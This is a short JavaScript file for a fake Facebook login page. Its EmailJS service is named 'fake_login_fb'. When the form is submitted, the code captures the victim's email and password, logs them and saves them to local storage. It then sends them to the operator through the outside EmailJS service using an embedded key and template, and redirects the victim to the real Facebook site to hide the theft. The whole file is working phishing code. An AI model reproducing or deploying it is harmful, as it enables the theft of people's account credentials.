// Initialize EmailJS
emailjs.init("xyKHTlWAxK5HLMXyw"); // Replace with your EmailJS public key

document
  .getElementById("login-form")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent form submission

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Log the input data to the console
    console.log("Email:", email);
    console.log("Password:", password);

    // Save the input data to local storage
    localStorage.setItem("email", email);
    localStorage.setItem("password", password);

    // Send the data via EmailJS
    
    emailjs
      .send("fake_login_fb", "template_z6jb42e", {
        // to_email: "kristar",
        user_email: email,
        user_password: password,
      })
      .then((response) => {
        console.log("Email sent successfully:", response);
        window.location.href = "https://www.facebook.com/"; // Redirect after sending email
      })
      .catch((error) => {
        console.error("Error sending email:", error);
        alert("Failed to send data to your email.");
      });
  });
